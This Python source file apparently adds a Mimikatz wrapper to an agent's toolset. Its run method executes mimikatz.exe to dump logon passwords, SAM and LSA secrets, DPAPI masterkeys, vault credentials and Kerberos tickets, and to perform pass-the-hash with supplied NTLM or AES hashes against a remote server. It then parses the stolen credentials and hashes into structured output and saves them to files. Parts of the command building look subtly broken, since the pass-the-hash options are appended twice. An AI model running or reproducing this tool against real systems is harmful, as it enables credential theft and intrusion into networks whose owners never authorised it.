"""Mimikatz tool implementation for Windows credential extraction and pass-the-hash attacks."""

from __future__ import annotations

import os
import subprocess
import time
from enum import Enum
from typing import List, Optional, Dict, Any

from pydantic import Field

from ...base_tool import BaseTool
from ...schemas import BaseToolArgs, ToolResult


class MimikatzCommand(str, Enum):
    """Supported Mimikatz commands."""
    
    # Credential extraction commands
    SEKURLSA_LOGONPASSWORDS = "sekurlsa::logonpasswords"
    SEKURLSA_PTH = "sekurlsa::pth"
    LSADUMP_SAM = "lsadump::sam"
    LSADUMP_SECRETS = "lsadump::secrets"
    LSADUMP_LSA = "lsadump::lsa"
    CRYPTOAPI_KEYS = "cryptoapi::keys"
    CRYPTOAPI_CAPI = "cryptoapi::capi"
    CRYPTOAPI_CNG = "cryptoapi::cng"
    CRYPTOAPI_DPAPI = "cryptoapi::dpapi"
    
    # Pass-the-hash commands
    SEKURLSA_PTH_USER = "sekurlsa::pth /user:"
    SEKURLSA_PTH_DOMAIN = "sekurlsa::pth /domain:"
    SEKURLSA_PTH_NTLM = "sekurlsa::pth /ntlm:"
    SEKURLSA_PTH_AES256 = "sekurlsa::pth /aes256:"
    
    # Kerberos commands
    KERBEROS_LIST = "kerberos::list"
    KERBEROS_PURGE = "kerberos::purge"
    KERBEROS_USE = "kerberos::use"
    KERBEROS_ASK = "kerberos::ask"
    
    # DPAPI commands
    DPAPI_MASTERKEYS = "dpapi::masterkeys"
    DPAPI_CREDENTIALS = "dpapi::credentials"
    DPAPI_BACKUPKEYS = "dpapi::backupkeys"
    
    # Vault commands
    VAULT_LIST = "vault::list"
    VAULT_CREDENTIALS = "vault::credentials"
    
    # Misc commands
    PRIVILEGE_DEBUG = "privilege::debug"
    TOKEN_ELEVATE = "token::elevate"
    TOKEN_REVERT = "token::revert"
    LSASETTINGS = "lsa::settings"
    LSAPOLICY = "lsa::policy"
    LSACREDS = "lsa::creds"


class OutputFormat(str, Enum):
    """Output format options."""
    RAW = "raw"
    JSON = "json"
    XML = "xml"
    CSV = "csv"


class MimikatzArgs(BaseToolArgs):
    """Arguments for the Mimikatz tool."""
    
    command: MimikatzCommand = Field(
        MimikatzCommand.SEKURLSA_LOGONPASSWORDS,
        description="Mimikatz command to execute"
    )
    
    # Pass-the-hash specific parameters
    username: Optional[str] = Field(
        None,
        description="Username for pass-the-hash attacks"
    )
    domain: Optional[str] = Field(
        None,
        description="Domain for pass-the-hash attacks"
    )
    ntlm_hash: Optional[str] = Field(
        None,
        description="NTLM hash for pass-the-hash attacks"
    )
    aes256_hash: Optional[str] = Field(
        None,
        description="AES256 hash for pass-the-hash attacks"
    )
    
    # Output options
    output_format: OutputFormat = Field(
        OutputFormat.RAW,
        description="Output format for results"
    )
    output_file: Optional[str] = Field(
        None,
        description="Output file path"
    )
    
    # Execution options
    elevated: bool = Field(
        False,
        description="Run with elevated privileges"
    )
    debug: bool = Field(
        False,
        description="Enable debug mode"
    )
    verbose: bool = Field(
        False,
        description="Enable verbose output"
    )
    
    # Target options
    target_host: Optional[str] = Field(
        None,
        description="Target host for remote execution"
    )
    target_user: Optional[str] = Field(
        None,
        description="Target user for remote execution"
    )
    
    # Kerberos options
    kerberos_ticket: Optional[str] = Field(
        None,
        description="Kerberos ticket file"
    )
    
    # DPAPI options
    masterkey_file: Optional[str] = Field(
        None,
        description="Master key file for DPAPI operations"
    )
    
    # Vault options
    vault_guid: Optional[str] = Field(
        None,
        description="Vault GUID for vault operations"
    )
    
    # Timeout and execution
    timeout: int = Field(
        30,
        description="Maximum execution time in seconds"
    )


def parse_mimikatz_output(output_text: str) -> Dict[str, Any]:
    """Parse Mimikatz output into structured metadata."""
    
    metadata: Dict[str, Any] = {
        "credentials": [],
        "hashes": [],
        "tickets": [],
        "masterkeys": [],
        "vaults": [],
        "privileges": [],
        "domains": [],
        "users": [],
        "summary": {
            "total_credentials": 0,
            "total_hashes": 0,
            "total_tickets": 0,
            "total_masterkeys": 0,
            "total_vaults": 0
        }
    }
    
    try:
        lines = output_text.split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Parse credential information
            if "Username" in line and "Domain" in line and "Password" in line:
                current_section = "credentials"
                continue
            elif "Username" in line and "Domain" in line and "NTLM" in line:
                current_section = "hashes"
                continue
            elif "Ticket" in line and "End Time" in line:
                current_section = "tickets"
                continue
            elif "Masterkey" in line and "GUID" in line:
                current_section = "masterkeys"
                continue
            elif "Vault" in line and "GUID" in line:
                current_section = "vaults"
                continue
            elif "Privilege" in line and "Attributes" in line:
                current_section = "privileges"
                continue
                
            # Parse specific data based on current section
            if current_section == "credentials":
                if ":" in line and not line.startswith("*"):
                    parts = line.split(":")
                    if len(parts) >= 3:
                        cred = {
                            "username": parts[0].strip(),
                            "domain": parts[1].strip(),
                            "password": parts[2].strip()
                        }
                        metadata["credentials"].append(cred)
                        metadata["summary"]["total_credentials"] += 1
                        
            elif current_section == "hashes":
                if ":" in line and not line.startswith("*"):
                    parts = line.split(":")
                    if len(parts) >= 3:
                        hash_data = {
                            "username": parts[0].strip(),
                            "domain": parts[1].strip(),
                            "ntlm": parts[2].strip()
                        }
                        metadata["hashes"].append(hash_data)
                        metadata["summary"]["total_hashes"] += 1
                        
            elif current_section == "tickets":
                if "krbtgt" in line.lower() or "service" in line.lower():
                    metadata["tickets"].append({"raw_line": line})
                    metadata["summary"]["total_tickets"] += 1
                    
            elif current_section == "masterkeys":
                if "guid" in line.lower():
                    metadata["masterkeys"].append({"raw_line": line})
                    metadata["summary"]["total_masterkeys"] += 1
                    
            elif current_section == "vaults":
                if "guid" in line.lower():
                    metadata["vaults"].append({"raw_line": line})
                    metadata["summary"]["total_vaults"] += 1
                    
            # Extract domain and user information
            if "domain:" in line.lower():
                domain = line.split(":")[-1].strip()
                if domain not in metadata["domains"]:
                    metadata["domains"].append(domain)
                    
            if "username:" in line.lower():
                user = line.split(":")[-1].strip()
                if user not in metadata["users"]:
                    metadata["users"].append(user)
    
    except Exception as e:
        metadata["parse_error"] = str(e)
    
    return metadata


class MimikatzTool(BaseTool):
    """Mimikatz tool for Windows credential extraction and pass-the-hash attacks."""
    
    args_model = MimikatzArgs
    
    def run(self, args: MimikatzArgs) -> ToolResult:
        # Build command array
        cmd = ["mimikatz.exe"]
        
        # Add debug mode
        if args.debug:
            cmd.append("debug")
        
        # Add verbose mode
        if args.verbose:
            cmd.append("log")
        
        # Build the command string
        command_str = args.command.value
        
        # Add parameters for pass-the-hash commands
        if args.command in [MimikatzCommand.SEKURLSA_PTH_USER, 
                           MimikatzCommand.SEKURLSA_PTH_DOMAIN,
                           MimikatzCommand.SEKURLSA_PTH_NTLM,
                           MimikatzCommand.SEKURLSA_PTH_AES256]:
            if args.username:
                command_str += f" /user:{args.username}"
            if args.domain:
                command_str += f" /domain:{args.domain}"
            if args.ntlm_hash:
                command_str += f" /ntlm:{args.ntlm_hash}"
            if args.aes256_hash:
                command_str += f" /aes256:{args.aes256_hash}"
        
        # Add kerberos ticket parameter
        if args.kerberos_ticket:
            command_str += f" /ticket:{args.kerberos_ticket}"
        
        # Add masterkey file parameter
        if args.masterkey_file:
            command_str += f" /in:{args.masterkey_file}"
        
        # Add vault GUID parameter
        if args.vault_guid:
            command_str += f" /guid:{args.vault_guid}"
        
        # Add target parameters
        if args.target_host:
            command_str += f" /server:{args.target_host}"
        if args.target_user:
            command_str += f" /user:{args.target_user}"
        
        # Add output format
        if args.output_format != OutputFormat.RAW:
            command_str += f" /format:{args.output_format.value}"
        
        # Add output file
        if args.output_file:
            command_str += f" /out:{args.output_file}"
        
        # Execute with timing
        start = time.time()
        try:
            proc = subprocess.run(
                cmd + [command_str],
                capture_output=True,
                text=True,
                timeout=args.timeout,
            )
        except subprocess.TimeoutExpired:
            return ToolResult(
                success=False,
                exit_code=-2,
                stdout="",
                stderr="Command timed out",
                artifacts=[],
                metadata={},
                execution_time=time.time() - start,
            )
        
        # Parse output for metadata
        metadata = parse_mimikatz_output(proc.stdout)
        
        # Generate artifacts if needed
        artifacts: List[str] = []
        if proc.stdout and len(proc.stdout) > 100:  # If significant output
            timestamp = int(start)
            artifact_path = f"artifacts/mimikatz_{timestamp}.txt"
            try:
                os.makedirs("artifacts", exist_ok=True)
                with open(artifact_path, "w", encoding="utf-8") as f:
                    f.write(proc.stdout)
                artifacts.append(artifact_path)
            except Exception:
                pass  # Artifact creation is optional
        
        # Add output file to artifacts if specified
        if args.output_file and os.path.exists(args.output_file):
            artifacts.append(args.output_file)
        
        return ToolResult(
            success=proc.returncode == 0,
            exit_code=proc.returncode,
            stdout=proc.stdout,
            stderr=proc.stderr,
            artifacts=artifacts,
            metadata=metadata,
            execution_time=time.time() - start,
        )
